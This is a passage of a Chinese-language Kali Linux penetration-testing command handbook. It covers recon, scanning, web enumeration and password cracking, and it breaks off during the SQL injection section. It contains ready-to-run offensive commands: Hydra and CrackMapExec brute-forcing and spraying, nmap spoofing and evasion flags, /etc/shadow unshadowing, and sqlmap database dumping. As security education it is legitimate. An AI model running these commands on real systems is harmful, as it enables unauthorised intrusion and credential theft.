

> 基于 Kali Linux 2024/2025 的渗透测试命令手册，从入门到精通

---

## 目录

1. [Kali Linux 概述](#1-kali-linux-概述)
2. [系统基础命令](#2-系统基础命令)
3. [网络命令](#3-网络命令)
4. [信息收集](#4-信息收集)
5. [漏洞扫描](#5-漏洞扫描)
6. [密码攻击](#6-密码攻击)
7. [Web 渗透](#7-web-渗透)
8. [无线攻击](#8-无线攻击)
9. [权限提升](#9-权限提升)
10. [后渗透](#10-后渗透)
11. [常见错误与解决](#11-常见错误与解决)

---

## 1. Kali Linux 概述

### 1.1 什么是 Kali Linux？

Kali Linux 是基于 Debian 的 Linux 发行版，专为数字取证和渗透测试设计。它预装了数百种安全工具，是安全研究人员和渗透测试人员的首选系统。

**通俗理解**：Kali Linux 就像一个"黑客工具箱"，里面装满了各种安全测试工具，让你可以合法地测试系统安全性。

```
┌─────────────────────────────────────────────────────────────────────┐
│                      Kali Linux 工具分类                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                 │
│  │ 信息收集     │  │ 漏洞分析     │  │ Web 应用     │                 │
│  │ Nmap        │  │ Nessus      │  │ Burp Suite  │                 │
│  │ Recon-ng    │  │ OpenVAS     │  │ SQLMap      │                 │
│  │ theHarvester│  │ Nikto       │  │ OWASP ZAP   │                 │
│  └─────────────┘  └─────────────┘  └─────────────┘                 │
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                 │
│  │ 密码攻击     │  │ 无线攻击     │  │ 逆向工程     │                 │
│  │ John        │  │ Aircrack-ng │  │ Ghidra      │                 │
│  │ Hashcat     │  │ Wifite      │  │ Radare2     │                 │
│  │ Hydra       │  │ Kismet      │  │ IDA Free    │                 │
│  └─────────────┘  └─────────────┘  └─────────────┘                 │
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                 │
│  │ 漏洞利用     │  │ 嗅探/欺骗    │  │ 后渗透      │                 │
│  │ Metasploit  │  │ Wireshark   │  │ Empire      │                 │
│  │ SearchSploit│  │ Ettercap    │  │ Mimikatz    │                 │
│  │ BeEF        │  │ Responder   │  │ Cobalt Strike│                │
│  └─────────────┘  └─────────────┘  └─────────────┘                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 Kali Linux 2024/2025 新特性

```
┌─────────────────────────────────────────────────────────────────────┐
│ Kali Linux 最新特性 (2024-2025)                                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ • 内核升级至 6.x 系列                                                │
│ • 默认使用 Xfce 桌面环境（更轻量）                                   │
│ • 支持 Apple Silicon (M1/M2/M3) 芯片                                │
│ • 新增 AI 辅助安全工具                                               │
│ • 改进的容器化支持 (Docker/Podman)                                   │
│ • 更新的 Python 3.12+ 环境                                          │
│ • 新增云安全测试工具                                                 │
│ • 改进的 ARM64 支持                                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.3 重要声明

```
⚠️ 法律声明 ⚠️

本笔记仅供合法的安全测试和学习使用。
在进行任何渗透测试之前，必须获得目标系统所有者的书面授权。
未经授权的渗透测试是违法行为，可能导致严重的法律后果。

合法使用场景：
✓ 自己的系统和网络
✓ 获得书面授权的客户系统
✓ CTF 比赛和靶场环境
✓ 专门的练习平台（如 HackTheBox、TryHackMe）
```

---

## 2. 系统基础命令

### 2.1 系统信息

```bash
# 查看系统版本
cat /etc/os-release
lsb_release -a

# 查看内核版本
uname -a
uname -r

# 查看系统架构
arch
uname -m

# 查看 CPU 信息
lscpu
cat /proc/cpuinfo

# 查看内存信息
free -h
cat /proc/meminfo

# 查看磁盘信息
df -h
lsblk
fdisk -l

# 查看系统运行时间
uptime

# 查看登录用户
who
w
last

# 查看主机名
hostname
hostnamectl
```

### 2.2 用户和权限管理

```bash
# 查看当前用户
whoami
id

# 切换用户
su - username
su -              # 切换到 root

# 使用 sudo 执行命令
sudo command
sudo -i           # 切换到 root shell
sudo -l           # 查看当前用户的 sudo 权限

# 创建用户
sudo useradd -m -s /bin/bash username
sudo passwd username

# 删除用户
sudo userdel -r username

# 添加用户到组
sudo usermod -aG sudo username    # 添加到 sudo 组
sudo usermod -aG docker username  # 添加到 docker 组

# 查看用户组
groups
groups username
cat /etc/group

# 文件权限
chmod 755 file        # rwxr-xr-x
chmod +x script.sh    # 添加执行权限
chmod -R 755 dir/     # 递归修改

# 文件所有者
chown user:group file
chown -R user:group dir/

# 特殊权限
chmod u+s file        # SUID
chmod g+s file        # SGID
chmod +t dir/         # Sticky bit
```

### 2.3 文件和目录操作

```bash
# 导航
cd /path/to/dir
cd ~              # 家目录
cd -              # 上一个目录
pwd               # 当前目录

# 列出文件
ls -la            # 详细列表，包含隐藏文件
ls -lah           # 人类可读的大小
ls -lt            # 按时间排序
ls -lS            # 按大小排序

# 创建
mkdir dir
mkdir -p dir1/dir2/dir3    # 递归创建
touch file

# 复制
cp file1 file2
cp -r dir1 dir2            # 递归复制
cp -p file1 file2          # 保留属性

# 移动/重命名
mv file1 file2
mv file dir/

# 删除
rm file
rm -rf dir/                # 强制递归删除（危险！）
rm -i file                 # 交互式删除

# 查找文件
find / -name "filename"
find / -name "*.txt"
find / -type f -size +100M           # 大于 100MB 的文件
find / -type f -perm -4000 2>/dev/null  # SUID 文件
find / -user root -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null    # 可写目录

# 定位命令
which nmap
whereis nmap
locate filename            # 需要先 updatedb

# 文件内容
cat file
head -n 20 file
tail -n 20 file
tail -f file               # 实时查看
less file
more file

# 文本搜索
grep "pattern" file
grep -r "pattern" dir/     # 递归搜索
grep -i "pattern" file     # 忽略大小写
grep -v "pattern" file     # 反向匹配
grep -E "regex" file       # 正则表达式

# 文本处理
awk '{print $1}' file
cut -d':' -f1 /etc/passwd
sed 's/old/new/g' file
sort file
uniq file
wc -l file                 # 行数
```

### 2.4 进程管理

```bash
# 查看进程
ps aux
ps -ef
ps aux | grep process_name

# 实时监控
top
htop                       # 更友好的界面

# 进程树
pstree

# 杀死进程
kill PID
kill -9 PID                # 强制杀死
killall process_name
pkill process_name

# 后台运行
command &
nohup command &
nohup command > output.log 2>&1 &

# 作业控制
jobs
fg %1                      # 前台运行
bg %1                      # 后台运行
Ctrl+Z                     # 暂停当前进程

# 查看端口占用
lsof -i :80
netstat -tlnp | grep 80
ss -tlnp | grep 80
```

### 2.5 包管理

```bash
# APT 包管理（Kali 基于 Debian）
sudo apt update                    # 更新软件源
sudo apt upgrade                   # 升级所有包
sudo apt full-upgrade              # 完整升级
sudo apt install package           # 安装
sudo apt remove package            # 卸载
sudo apt purge package             # 完全卸载（包括配置）
sudo apt autoremove                # 清理无用依赖
sudo apt search keyword            # 搜索
sudo apt show package              # 显示包信息
sudo apt list --installed          # 列出已安装

# 清理缓存
sudo apt clean
sudo apt autoclean

# 修复依赖
sudo apt --fix-broken install

# 添加软件源
sudo add-apt-repository ppa:xxx
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys KEY

# DPKG
sudo dpkg -i package.deb           # 安装 deb 包
sudo dpkg -r package               # 卸载
dpkg -l                            # 列出已安装
dpkg -L package                    # 列出包文件

# Snap（部分工具）
sudo snap install package
sudo snap remove package
snap list
```


### 2.6 服务管理

```bash
# Systemd 服务管理
sudo systemctl start service       # 启动
sudo systemctl stop service        # 停止
sudo systemctl restart service     # 重启
sudo systemctl status service      # 状态
sudo systemctl enable service      # 开机启动
sudo systemctl disable service     # 禁用开机启动
sudo systemctl list-units --type=service  # 列出所有服务

# 常用服务
sudo systemctl start ssh           # SSH 服务
sudo systemctl start apache2       # Apache
sudo systemctl start postgresql    # PostgreSQL
sudo systemctl start mysql         # MySQL

# 查看服务日志
journalctl -u service
journalctl -f                      # 实时日志
journalctl --since "1 hour ago"
```

### 2.7 压缩和解压

```bash
# tar
tar -cvf archive.tar files/        # 打包
tar -xvf archive.tar               # 解包
tar -czvf archive.tar.gz files/    # 打包并 gzip 压缩
tar -xzvf archive.tar.gz           # 解压 gzip
tar -cjvf archive.tar.bz2 files/   # 打包并 bzip2 压缩
tar -xjvf archive.tar.bz2          # 解压 bzip2

# gzip
gzip file                          # 压缩
gunzip file.gz                     # 解压

# zip
zip -r archive.zip files/          # 压缩
unzip archive.zip                  # 解压
unzip -l archive.zip               # 列出内容

# 7z
7z a archive.7z files/             # 压缩
7z x archive.7z                    # 解压

# rar
unrar x archive.rar                # 解压
```

---

## 3. 网络命令

### 3.1 网络配置

```bash
# 查看网络接口
ip addr
ip a
ifconfig                           # 旧命令，可能需要安装 net-tools

# 查看特定接口
ip addr show eth0

# 启用/禁用接口
sudo ip link set eth0 up
sudo ip link set eth0 down

# 配置 IP 地址
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip addr del 192.168.1.100/24 dev eth0

# 查看路由表
ip route
route -n
netstat -rn

# 添加路由
sudo ip route add 10.0.0.0/8 via 192.168.1.1
sudo ip route del 10.0.0.0/8

# 默认网关
sudo ip route add default via 192.168.1.1

# DNS 配置
cat /etc/resolv.conf
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf

# 主机名解析
cat /etc/hosts
sudo nano /etc/hosts

# 网络管理器
nmcli device status
nmcli connection show
nmcli device wifi list
nmcli device wifi connect "SSID" password "password"
```

### 3.2 网络诊断

```bash
# Ping
ping -c 4 target.com
ping -c 4 -s 1000 target.com       # 指定包大小

# Traceroute
traceroute target.com
traceroute -n target.com           # 不解析主机名
mtr target.com                     # 更好的 traceroute

# DNS 查询
nslookup target.com
dig target.com
dig target.com ANY                 # 所有记录
dig @8.8.8.8 target.com           # 指定 DNS 服务器
dig +short target.com              # 简短输出
host target.com

# Whois
whois target.com
whois 8.8.8.8

# 端口连接测试
nc -zv target.com 80               # TCP
nc -zvu target.com 53              # UDP
telnet target.com 80

# 网络连接状态
netstat -tlnp                      # TCP 监听端口
netstat -ulnp                      # UDP 监听端口
netstat -an                        # 所有连接
ss -tlnp                           # 更快的替代
ss -s                              # 统计信息

# ARP 表
arp -a
ip neigh

# 网络统计
netstat -s
ss -s
```

### 3.3 数据传输

```bash
# curl
curl http://target.com
curl -I http://target.com          # 只获取头部
curl -X POST -d "data" http://target.com
curl -o file.html http://target.com
curl -O http://target.com/file.zip
curl -u user:pass http://target.com
curl -k https://target.com         # 忽略 SSL 证书
curl -x proxy:port http://target.com
curl -A "User-Agent" http://target.com
curl -H "Header: Value" http://target.com
curl -b "cookie=value" http://target.com
curl -c cookies.txt http://target.com  # 保存 cookie
curl -L http://target.com          # 跟随重定向

# wget
wget http://target.com/file.zip
wget -O newname.zip http://target.com/file.zip
wget -c http://target.com/file.zip # 断点续传
wget -r http://target.com          # 递归下载
wget --mirror http://target.com    # 镜像网站
wget -q http://target.com          # 静默模式
wget --user=user --password=pass http://target.com

# scp（安全复制）
scp file user@host:/path/
scp user@host:/path/file ./
scp -r dir user@host:/path/
scp -P 2222 file user@host:/path/  # 指定端口

# rsync
rsync -avz source/ dest/
rsync -avz -e ssh source/ user@host:/dest/
rsync -avz --progress source/ dest/

# FTP
ftp target.com
# 或使用 lftp（更强大）
lftp -u user,pass target.com
```

### 3.4 SSH 操作

```bash
# SSH 连接
ssh user@host
ssh -p 2222 user@host              # 指定端口
ssh -i key.pem user@host           # 使用密钥

# SSH 密钥生成
ssh-keygen -t rsa -b 4096
ssh-keygen -t ed25519              # 更安全的算法

# 复制公钥到服务器
ssh-copy-id user@host
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host

# SSH 隧道（端口转发）
# 本地转发：访问本地 8080 转发到远程 80
ssh -L 8080:localhost:80 user@host

# 远程转发：远程访问 8080 转发到本地 80
ssh -R 8080:localhost:80 user@host

# 动态转发（SOCKS 代理）
ssh -D 1080 user@host

# SSH 配置文件
cat ~/.ssh/config
# Host myserver
#     HostName 192.168.1.100
#     User admin
#     Port 22
#     IdentityFile ~/.ssh/id_rsa

# 后台运行 SSH 隧道
ssh -fN -L 8080:localhost:80 user@host
```

---

## 4. 信息收集

### 4.1 被动信息收集

**被动信息收集**是指在不直接与目标系统交互的情况下收集信息，不会在目标系统留下任何痕迹。

```bash
# Whois 查询
whois target.com
whois 8.8.8.8

# DNS 信息收集
# 基本查询
dig target.com
dig target.com ANY
dig target.com MX
dig target.com NS
dig target.com TXT

# DNS 区域传送（如果配置不当）
dig axfr @ns1.target.com target.com
host -t axfr target.com ns1.target.com

# 子域名枚举
# 使用 dnsrecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# 使用 dnsenum
dnsenum target.com
dnsenum --enum target.com

# 使用 fierce
fierce --domain target.com

# 使用 amass（强大的子域名枚举工具）
amass enum -d target.com
amass enum -passive -d target.com
amass enum -brute -d target.com -w /path/to/wordlist

# 使用 subfinder
subfinder -d target.com
subfinder -d target.com -o subdomains.txt

# 使用 assetfinder
assetfinder target.com
assetfinder --subs-only target.com
```

```bash
# theHarvester - 邮箱和子域名收集
theHarvester -d target.com -b google
theHarvester -d target.com -b all
theHarvester -d target.com -b linkedin
theHarvester -d target.com -l 500 -b all

# 支持的数据源
# google, bing, linkedin, twitter, yahoo, baidu, 
# shodan, censys, hunter, securitytrails 等

# Shodan（需要 API key）
shodan init YOUR_API_KEY
shodan search "target.com"
shodan host 8.8.8.8
shodan search "apache" --limit 10

# Censys
# 需要在 censys.io 注册获取 API

# Google Dorks（在浏览器中使用）
# site:target.com
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"
# site:target.com ext:sql | ext:db | ext:log
# "target.com" password | passwd | pwd
```

### 4.2 主动信息收集

**主动信息收集**会直接与目标系统交互，可能会被检测到。

```bash
# Nmap - 网络扫描之王
# 基本扫描
nmap target.com
nmap 192.168.1.0/24

# 主机发现
nmap -sn 192.168.1.0/24            # Ping 扫描
nmap -sn -PS22,80,443 192.168.1.0/24  # TCP SYN Ping
nmap -sn -PA80,443 192.168.1.0/24     # TCP ACK Ping
nmap -sn -PU53 192.168.1.0/24         # UDP Ping
nmap -sn -PE 192.168.1.0/24           # ICMP Echo Ping

# 端口扫描
nmap -p 80 target.com              # 单个端口
nmap -p 80,443,8080 target.com     # 多个端口
nmap -p 1-1000 target.com          # 端口范围
nmap -p- target.com                # 所有端口 (1-65535)
nmap --top-ports 100 target.com    # 最常用的 100 个端口

# 扫描类型
nmap -sT target.com                # TCP Connect 扫描
nmap -sS target.com                # TCP SYN 扫描（半开放，需要 root）
nmap -sU target.com                # UDP 扫描
nmap -sA target.com                # TCP ACK 扫描
nmap -sN target.com                # TCP Null 扫描
nmap -sF target.com                # TCP FIN 扫描
nmap -sX target.com                # TCP Xmas 扫描

# 服务和版本检测
nmap -sV target.com                # 版本检测
nmap -sV --version-intensity 5 target.com  # 更深入的版本检测
nmap -A target.com                 # 激进扫描（OS + 版本 + 脚本 + traceroute）

# 操作系统检测
nmap -O target.com
nmap -O --osscan-guess target.com

# 脚本扫描
nmap -sC target.com                # 默认脚本
nmap --script=vuln target.com      # 漏洞脚本
nmap --script=http-* target.com    # HTTP 相关脚本
nmap --script=smb-* target.com     # SMB 相关脚本

# 常用脚本示例
nmap --script=http-enum target.com
nmap --script=http-vuln-* target.com
nmap --script=ssl-heartbleed target.com
nmap --script=smb-vuln-ms17-010 target.com
nmap --script=ftp-anon target.com

# 输出格式
nmap -oN output.txt target.com     # 普通格式
nmap -oX output.xml target.com     # XML 格式
nmap -oG output.gnmap target.com   # Grepable 格式
nmap -oA output target.com         # 所有格式

# 性能优化
nmap -T4 target.com                # 更快的扫描 (T0-T5)
nmap -T5 target.com                # 最快（可能不准确）
nmap --min-rate 1000 target.com    # 最小发包速率
nmap --max-retries 1 target.com    # 减少重试

# 规避检测
nmap -f target.com                 # 分片
nmap -D RND:10 target.com          # 诱饵扫描
nmap -S spoofed_ip target.com      # IP 欺骗
nmap --source-port 53 target.com   # 源端口欺骗
nmap --data-length 25 target.com   # 添加随机数据

# 综合示例
nmap -sS -sV -sC -O -p- -T4 -oA full_scan target.com
```


### 4.3 Web 信息收集

```bash
# Whatweb - Web 指纹识别
whatweb target.com
whatweb -v target.com              # 详细输出
whatweb -a 3 target.com            # 激进模式
whatweb --log-json=output.json target.com

# Wappalyzer（浏览器插件或命令行）
# 识别网站使用的技术栈

# httpx - 快速 HTTP 探测
httpx -l urls.txt
httpx -l urls.txt -status-code -title -tech-detect
httpx -u target.com -probe

# 目录枚举
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
gobuster dir -u http://target.com -w wordlist.txt -t 50 -o output.txt
gobuster dir -u http://target.com -w wordlist.txt -k  # 忽略 SSL

# Dirb
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/big.txt
dirb http://target.com -o output.txt

# Dirsearch
dirsearch -u http://target.com
dirsearch -u http://target.com -e php,html,js
dirsearch -u http://target.com -w /path/to/wordlist
dirsearch -u http://target.com -t 50 --random-agent

# Feroxbuster（更快的 Rust 实现）
feroxbuster -u http://target.com
feroxbuster -u http://target.com -w /path/to/wordlist
feroxbuster -u http://target.com -x php,html -t 100

# ffuf - 快速 Web Fuzzer
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234  # 过滤大小

# 参数 Fuzzing
ffuf -u "http://target.com/page?FUZZ=test" -w params.txt
ffuf -u "http://target.com/page?id=FUZZ" -w numbers.txt

# 虚拟主机枚举
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fc 404

# Nikto - Web 漏洞扫描
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -ssl
nikto -h http://target.com -o output.html -Format html
nikto -h http://target.com -Tuning x 6  # 只扫描特定类型

# WPScan - WordPress 扫描
wpscan --url http://target.com
wpscan --url http://target.com --enumerate u    # 枚举用户
wpscan --url http://target.com --enumerate p    # 枚举插件
wpscan --url http://target.com --enumerate t    # 枚举主题
wpscan --url http://target.com --enumerate vp   # 有漏洞的插件
wpscan --url http://target.com --api-token YOUR_TOKEN
wpscan --url http://target.com -U users.txt -P passwords.txt  # 暴力破解

# CMSmap - CMS 扫描
cmsmap http://target.com
cmsmap -t http://target.com -f W    # WordPress
cmsmap -t http://target.com -f J    # Joomla
cmsmap -t http://target.com -f D    # Drupal
```

### 4.4 网络服务枚举

```bash
# SMB 枚举 (445/tcp)
# enum4linux
enum4linux target.com
enum4linux -a target.com           # 完整枚举
enum4linux -U target.com           # 用户枚举
enum4linux -S target.com           # 共享枚举

# smbclient
smbclient -L //target.com -N       # 列出共享（匿名）
smbclient //target.com/share -N    # 连接共享
smbclient //target.com/share -U user

# smbmap
smbmap -H target.com
smbmap -H target.com -u user -p password
smbmap -H target.com -u null -p ""  # 空会话

# crackmapexec (CME)
crackmapexec smb target.com
crackmapexec smb target.com -u user -p password
crackmapexec smb target.com -u user -p password --shares
crackmapexec smb target.com -u user -p password --users

# SNMP 枚举 (161/udp)
snmpwalk -v2c -c public target.com
snmpwalk -v2c -c public target.com 1.3.6.1.2.1.1
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com
snmp-check target.com

# LDAP 枚举 (389/tcp)
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com" "(objectClass=user)"

# NFS 枚举 (2049/tcp)
showmount -e target.com
nmap --script=nfs-ls,nfs-showmount,nfs-statfs target.com

# RPC 枚举 (111/tcp)
rpcinfo -p target.com
rpcclient -U "" target.com

# SMTP 枚举 (25/tcp)
smtp-user-enum -M VRFY -U users.txt -t target.com
nmap --script=smtp-enum-users target.com

# FTP 枚举 (21/tcp)
ftp target.com
nmap --script=ftp-anon target.com
```

### 4.5 Recon-ng 框架

```bash
# 启动 Recon-ng
recon-ng

# 基本命令
help
modules search
modules load module_name
info
options set OPTION value
run

# 工作区管理
workspaces create target_recon
workspaces list
workspaces load target_recon

# 添加目标
db insert domains
# 输入: target.com

# 常用模块
modules load recon/domains-hosts/hackertarget
options set SOURCE target.com
run

modules load recon/domains-hosts/google_site_web
modules load recon/hosts-hosts/resolve
modules load recon/hosts-ports/shodan_ip

# 查看结果
show hosts
show contacts
show credentials

# 导出报告
modules load reporting/html
options set FILENAME /path/to/report.html
run
```

---

## 5. 漏洞扫描

### 5.1 Nmap 漏洞脚本

```bash
# 通用漏洞扫描
nmap --script=vuln target.com
nmap --script=vulners target.com

# 特定漏洞检测
# SMB 漏洞
nmap --script=smb-vuln-* target.com
nmap --script=smb-vuln-ms17-010 target.com    # 永恒之蓝
nmap --script=smb-vuln-ms08-067 target.com

# SSL/TLS 漏洞
nmap --script=ssl-heartbleed target.com       # 心脏出血
nmap --script=ssl-poodle target.com
nmap --script=ssl-enum-ciphers target.com

# HTTP 漏洞
nmap --script=http-vuln-* target.com
nmap --script=http-shellshock target.com
nmap --script=http-sql-injection target.com

# 其他服务漏洞
nmap --script=ftp-vuln-* target.com
nmap --script=mysql-vuln-* target.com
nmap --script=rdp-vuln-* target.com
```

### 5.2 Searchsploit

```bash
# 搜索漏洞利用
searchsploit apache 2.4
searchsploit wordpress
searchsploit -t "remote code execution"

# 精确搜索
searchsploit -e "apache 2.4.49"

# 排除结果
searchsploit apache --exclude="Denial of Service"

# 查看漏洞详情
searchsploit -x exploits/linux/remote/12345.py

# 复制漏洞利用到当前目录
searchsploit -m exploits/linux/remote/12345.py

# 更新数据库
searchsploit -u

# 输出格式
searchsploit apache -j              # JSON 格式
searchsploit apache --json
searchsploit apache -w              # 显示 URL
```

### 5.3 Nuclei（现代漏洞扫描器）

```bash
# 安装（如果未安装）
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 基本扫描
nuclei -u http://target.com
nuclei -l urls.txt

# 使用特定模板
nuclei -u http://target.com -t cves/
nuclei -u http://target.com -t vulnerabilities/
nuclei -u http://target.com -t exposures/

# 按严重程度过滤
nuclei -u http://target.com -severity critical,high
nuclei -u http://target.com -severity medium,low

# 按标签过滤
nuclei -u http://target.com -tags cve,rce
nuclei -u http://target.com -tags sqli,xss

# 更新模板
nuclei -update-templates

# 输出
nuclei -u http://target.com -o results.txt
nuclei -u http://target.com -json -o results.json

# 速率限制
nuclei -u http://target.com -rate-limit 100
nuclei -u http://target.com -bulk-size 25 -concurrency 10
```

### 5.4 OpenVAS/GVM

```bash
# 启动 OpenVAS
sudo gvm-start

# 或使用 systemctl
sudo systemctl start gvmd
sudo systemctl start gsad
sudo systemctl start ospd-openvas

# 访问 Web 界面
# https://localhost:9392

# 命令行操作
gvm-cli socket --xml "<get_version/>"

# 创建目标
gvm-cli socket --xml '<create_target name="Target1"><hosts>192.168.1.100</hosts></create_target>'

# 创建任务
gvm-cli socket --xml '<create_task name="Scan1"><target id="target_id"/><config id="config_id"/></create_task>'

# 启动扫描
gvm-cli socket --xml '<start_task task_id="task_id"/>'

# 获取报告
gvm-cli socket --xml '<get_reports/>'
```


---

## 6. 密码攻击

### 6.1 密码字典

```bash
# Kali 内置字典位置
ls /usr/share/wordlists/

# 常用字典
/usr/share/wordlists/rockyou.txt.gz          # 最常用
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/                          # SecLists 集合

# 解压 rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 下载 SecLists
sudo apt install seclists

# 自定义字典生成
# Crunch
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
crunch 8 8 -t @@@@%%%% -o wordlist.txt    # @=小写 %=数字
crunch 6 6 0123456789 -o numbers.txt

# 参数说明
# @ = 小写字母
# , = 大写字母
# % = 数字
# ^ = 特殊字符

# CeWL - 从网站生成字典
cewl http://target.com -w wordlist.txt
cewl http://target.com -d 2 -m 5 -w wordlist.txt  # 深度2，最小长度5
cewl http://target.com --with-numbers -w wordlist.txt

# CUPP - 基于个人信息生成字典
cupp -i                                # 交互模式
cupp -w wordlist.txt                   # 改进现有字典

# Mentalist（GUI 工具）
# 用于创建自定义字典规则
```

### 6.2 在线密码破解

```bash
# Hydra - 在线暴力破解
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l user -P passwords.txt -t 4 ssh://target.com  # 4 线程

# FTP
hydra -l user -P passwords.txt ftp://target.com

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/admin

# HTTP POST Form
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"

# 参数说明
# ^USER^ = 用户名占位符
# ^PASS^ = 密码占位符
# :Invalid credentials = 失败标识

# MySQL
hydra -l root -P passwords.txt mysql://target.com

# SMB
hydra -l administrator -P passwords.txt smb://target.com

# RDP
hydra -l administrator -P passwords.txt rdp://target.com

# 常用参数
# -l 单个用户名
# -L 用户名列表
# -p 单个密码
# -P 密码列表
# -t 线程数
# -f 找到后停止
# -v 详细输出
# -V 显示每次尝试
# -s 指定端口

# Medusa - 另一个在线破解工具
medusa -h target.com -u admin -P passwords.txt -M ssh
medusa -h target.com -U users.txt -P passwords.txt -M ftp

# Ncrack
ncrack -p 22 --user admin -P passwords.txt target.com
ncrack -p 3389 --user administrator -P passwords.txt target.com

# CrackMapExec - 网络密码喷洒
crackmapexec smb target.com -u users.txt -p passwords.txt
crackmapexec smb target.com -u user -p password --pass-pol  # 密码策略
crackmapexec ssh target.com -u users.txt -p passwords.txt
crackmapexec winrm target.com -u user -p password
```

### 6.3 离线密码破解

```bash
# John the Ripper
# 基本使用
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 指定格式
john --format=raw-md5 hashes.txt
john --format=raw-sha256 hashes.txt
john --format=bcrypt hashes.txt
john --format=nt hashes.txt           # Windows NTLM

# 查看支持的格式
john --list=formats

# 显示破解结果
john --show hashes.txt

# 规则攻击
john --wordlist=wordlist.txt --rules hashes.txt

# 增量模式
john --incremental hashes.txt

# 破解 /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# 破解 ZIP 文件
zip2john protected.zip > zip.hash
john zip.hash

# 破解 RAR 文件
rar2john protected.rar > rar.hash
john rar.hash

# 破解 PDF 文件
pdf2john protected.pdf > pdf.hash
john pdf.hash

# 破解 SSH 私钥
ssh2john id_rsa > ssh.hash
john ssh.hash

# 破解 Keepass
keepass2john database.kdbx > keepass.hash
john keepass.hash
```

```bash
# Hashcat - GPU 加速破解
# 基本使用
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 100 hashes.txt wordlist.txt                       # SHA1
hashcat -m 1400 hashes.txt wordlist.txt                      # SHA256
hashcat -m 1000 hashes.txt wordlist.txt                      # NTLM
hashcat -m 3200 hashes.txt wordlist.txt                      # bcrypt

# 常用哈希类型 (-m)
# 0     = MD5
# 100   = SHA1
# 1400  = SHA256
# 1700  = SHA512
# 1000  = NTLM
# 3200  = bcrypt
# 1800  = sha512crypt (Linux)
# 500   = md5crypt (Linux)
# 13100 = Kerberos TGS-REP

# 攻击模式 (-a)
# 0 = 字典攻击
# 1 = 组合攻击
# 3 = 掩码攻击（暴力）
# 6 = 字典 + 掩码
# 7 = 掩码 + 字典

# 掩码攻击
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a    # 6位所有字符
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d    # 6位数字
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l    # 6位小写

# 掩码字符集
# ?l = 小写字母 (a-z)
# ?u = 大写字母 (A-Z)
# ?d = 数字 (0-9)
# ?s = 特殊字符
# ?a = 所有字符

# 规则攻击
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 显示结果
hashcat -m 0 hashes.txt --show

# 恢复会话
hashcat --restore

# 基准测试
hashcat -b

# 设备信息
hashcat -I
```

### 6.4 哈希识别

```bash
# hash-identifier
hash-identifier
# 然后输入哈希值

# hashid
hashid 'hash_value'
hashid -m 'hash_value'              # 显示 hashcat 模式

# haiti
haiti 'hash_value'

# 在线工具
# https://hashes.com/en/tools/hash_identifier
# https://www.tunnelsup.com/hash-analyzer/

# 常见哈希格式
# MD5:      32 位十六进制
# SHA1:     40 位十六进制
# SHA256:   64 位十六进制
# SHA512:   128 位十六进制
# NTLM:     32 位十六进制
# bcrypt:   $2a$/$2b$/$2y$ 开头
# sha512crypt: $6$ 开头
# md5crypt: $1$ 开头
```

---

## 7. Web 渗透

### 7.1 SQL 注入

```bash
# SQLMap - 自动化 SQL 注入工具
# 基本使用
sqlmap -u "http://target.com/page?id=1"

# 指定参数
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"

# 从文件读取请求（Burp 保存的请求）
sqlmap -r request.txt

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="session=abc123"

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 枚举数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 枚举表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 枚举列
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# 导出数据
